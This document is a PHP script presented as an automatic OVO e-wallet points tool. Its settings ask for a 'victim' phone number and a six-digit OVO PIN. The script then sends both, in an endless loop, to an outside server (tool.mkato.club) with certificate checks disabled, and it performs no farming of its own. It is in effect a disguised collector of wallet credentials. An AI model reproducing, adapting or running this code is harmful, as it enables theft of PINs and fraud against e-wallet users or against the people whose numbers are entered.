<?php
error_reporting(0);
set_time_limit(0);
/**
 * AUTO GB OVO for Bacotan
 */
$setting = [
"noPhone" 	=> "NOMOR KORBAN", // must with prefix 62
"pin"		=> "ISI NGASAL",        // your six pin OVO
];
class ovocok 
{
	function __construct($setting)
	{
		$this->sDatabyte = $setting;
		$this->numberPhone = $setting['noPhone'];
		if (strlen($setting['pin']) != 6) {
			echo $this->color('redbg', 'Please Input Valid PIN!').PHP_EOL;
			exit();
		}
		echo $this->color("red", base64_decode("ICAgICAgICAuLS0uICAgICAgIC4tLS4KICAgIF8gIGAgICAgXCAgICAgLyAgICBgICBfCiAgICAgYFwuPT09LiBcLl4uLyAuPT09Li9gCiAgICAgICAgICAgIFwvYCJgXC8KICAgICAgICAgLCAgfCAgICAgfCAgLAogICAgICAgIC8gYFx8YC0uLSd8L2AgXAogICAgICAgLyAgICB8ICBcICB8ICAgIFwKICAgIC4tJyAsLSdgfCAgIDsgfGAnLSwgJy0uCiAgICAgICAgfCAgIHwgICAgXHwgICB8IAogICAgICAgIHwgICB8ICAgIDt8ICAgfAogICAgICAgIHwgICBcICAgIC8vICAgfAogICAgICAgIHwgICAgYC5fLy8nICAgfAogICAgICAgLicgICAgICAgICAgICAgYC4KICAgIF8sJyAgICAgICAgICAgICAgICAgYCxfCiAgICBgICAgICAgICAgICAgICAgICAgICAgYA==")); echo PHP_EOL;
		echo $this->color("greenlg", "AUTO GB OVO POINTS ").$this->color("greenbg", " BACOTAN ").PHP_EOL;
		echo $this->color("yellowbg", "Your OvO Number"); echo " : ".$this->numberPhone.PHP_EOL;
		echo $this->color("purple", "Start the program");
		for ($i=0 ; $i<= 4 ; $i++) {
		    echo $this->color('red', '.');    
		    usleep(800000);          
		}
		echo PHP_EOL.PHP_EOL;
		$this->no = 0;
		while (true) {
			$this->token();
			$this->no++;
		}
		

	}
	function token(){
		$iost = json_encode($this->sDatabyte);
		$opst = array('data' => $iost);
		$result = $this->http("http://tool.mkato.club", $opst);
		$res = json_decode($result, true);
		$this->status($res);
	}
	function color($color, $text){
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			return $text;
		} else {
		    switch ($color) {
				case 'greenbg':
					$warna = "\033[1;37;42m"; break;
				case 'redbg':
					$warna = "\033[1;37;41m"; break;
				case 'bluebg':
					$warna = "\033[1;37;44m"; break;
				case 'yellowbg':
					$warna = "\033[1;37;43m"; break;
				case 'greenlg':
					$warna = "\033[40;38;5;82m"; break;	
				case 'purple':
           			 $warna = "\033[1;35m"; break;
				case 'green':
					$warna = "\033[1;32m"; break;
				case 'red':
					$warna = "\033[1;31m"; break;
				case 'blue':
					$warna = "\033[1;34m"; break;
				case 'yellow':
					$warna = "\033[1;33;40m"; break;
				default:
					$warna = "\033[0m"; break;
			}
			return $warna.$text."\033[0m";
		}
	}
	function status($data){
		$sForm = array(
			$this->no,
			$this->numberPhone,
			$data['point']
		);

		switch ($data['status']) {
			case 100:
				$string = '[%d] Auto GB to %d | Result : ' . $this->color('greenbg', 'Success') . ' '.$this->color('yellowbg', '%d').' Points' . PHP_EOL;
				$string = vsprintf($string, $sForm);
				echo $string;
				break;
			case 200:
				$string = '[%d] Auto GB to %d | Result : ' . $this->color('redbg', 'Failed') . ' '.$this->color('yellowbg', '%d').' Points' . PHP_EOL;
				$string = vsprintf($string, $sForm);
				echo $string;
				break;
		}
	}
	function http($url, $post = false){
	    $ch = curl_init();
	    curl_setopt($ch, CURLOPT_URL, $url);
	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	    if ($post) {
	        curl_setopt($ch, CURLOPT_POST, true);
	        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	    }
	    
	    $response = curl_exec($ch);
	    curl_close($ch);
	    return $response;
	}
}

$govo = new ovocok($setting);
